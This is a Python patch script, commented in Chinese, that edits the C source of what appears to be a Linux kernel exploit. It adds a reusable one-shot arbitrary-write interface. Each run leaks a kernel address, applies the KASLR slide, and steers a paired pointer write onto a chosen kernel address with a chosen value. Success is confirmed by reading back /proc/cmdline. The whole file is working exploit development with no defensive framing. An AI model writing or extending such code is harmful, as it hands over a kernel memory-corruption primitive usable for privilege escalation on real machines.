# -*- coding: utf-8 -*-
"""pr.c: 加"一发一发打"的通用写接口 —— dst/val/probe/expect。

一次进程调用 = 造幽灵 → 泄漏 S → **打一发有效写** → 用 probe 文件的判据确认 → 退出。
一个 boot 里连着跑 N 次就是 N 笔写(幽灵一发就被消耗, 所以每次调用都要重新造)。

  dst=<hex>        写的目的地址(**链接期**地址, 程序自动 +slide)
  val=<hex|S+off>  写的值: 绝对地址(hex, 链接期) 或 S 相对量(S+0x100 / S-0x98)
  probe=<path>     判据文件(默认 /proc/cmdline)
  expect=<hex>     期望在 probe 里读到的 8 字节小端值(链接期地址, 自动 +slide); 不给就只比"变没变"
"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

# ---- 全局 ----
anchor = 'static int AVTEST = 0;'
assert anchor in s
s = s.replace(anchor, anchor + '''
/* 通用单发写接口(见文件尾注释): 一次调用 = 一笔有效写 */
static uintptr_t DST = 0;                 /* 目的地址(链接期, 运行时 +slide); 0 = 不用这个模式 */
static long VAL_ABS = -1;                 /* 值的链接期地址; -1 = 用 S 相对量 */
static long VAL_REL = 0;                  /* S 相对量 */
static const char *PROBE_TXT = "/proc/cmdline";
static uintptr_t EXPECT = 0;              /* 期望读到的 8 字节(运行时地址) */''')

# ---- CLI ----
old_cli = '''    } else if (!strcmp(argv[i], "avtest")) {'''
new_cli = '''    } else if (!strncmp(argv[i], "dst=", 4)) {
      DST = (uintptr_t)strtoull(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "val=", 4)) {
      const char *v = argv[i] + 4;
      if (v[0] == 'S' && (v[1] == '+' || v[1] == '-')) {
        VAL_ABS = -1; VAL_REL = (long)strtoll(v + 1, NULL, 0);
      } else { VAL_ABS = (long)strtoull(v, NULL, 0); }
    } else if (!strncmp(argv[i], "probe=", 6)) {
      PROBE_TXT = argv[i] + 6; PROBE_PATH = PROBE_TXT;
    } else if (!strncmp(argv[i], "expect=", 7)) {
      EXPECT = (uintptr_t)strtoull(argv[i] + 7, NULL, 0);
    } else if (!strcmp(argv[i], "avtest")) {'''
assert old_cli in s
s = s.replace(old_cli, new_cli)

# ---- 载荷: DST 模式优先 ----
old_ph = '''    if (AVTEST && ph == 1) {          /* .bss 可写性判决: 落点=avenrun, 值=带内地址 */'''
new_ph = '''    if (DST) {
      /* ★ 走**写①**: parent = dst-8 ⇒ `*(parent+8) = child` 正好落在 dst。
         副作用(写② `*(child) = parent`)要求 child 也**可写** ⇒ val 用 S 相对量最安全
         (落在我们自己的死帧/带里)。 */
      P = DST + SLIDE - 8;
      C = (VAL_ABS < 0) ? (uintptr_t)((long)S + VAL_REL) : (uintptr_t)(VAL_ABS + SLIDE);
    } else if (AVTEST && ph == 1) {   /* .bss 可写性判决: 落点=avenrun, 值=带内地址 */'''
assert old_ph in s
s = s.replace(old_ph, new_ph)

# ---- 判据: DST 模式下期望值比对 ----
old_det = '''          if (phase == 2) {'''
if old_det not in s:
    # 现在的落地分支在 "cmdline 变了" 那里, 统一加一句 expect 比对
    old2 = '''          say("[LAND] 相%d 落地(第 %ld 发): 读回 %zd 字节\\n", phase, tries, nl);'''
    new2 = '''          say("[LAND] 相%d 落地(第 %ld 发): 读回 %zd 字节\\n", phase, tries, nl);
          if (EXPECT) {
            int at = -1;
            for (ssize_t i = 0; i + 8 <= nl; i++)
              if (!memcmp(nb + i, &EXPECT, 8)) { at = (int)i; break; }
            say(at >= 0 ? "★★★ 正对照命中: probe 第 %d 字节 = %016lx ⇒ 写落点+读通道+slide+几何 全对\\n"
                          : "× 没读到期望值 %016lx(读通道开了但内容不对?)\\n",
                at >= 0 ? at : 0, (unsigned long)EXPECT);
          }'''
    assert old2 in s
    s = s.replace(old2, new2)

io.open(p, 'w', encoding='utf-8').write(s)
print('ok')
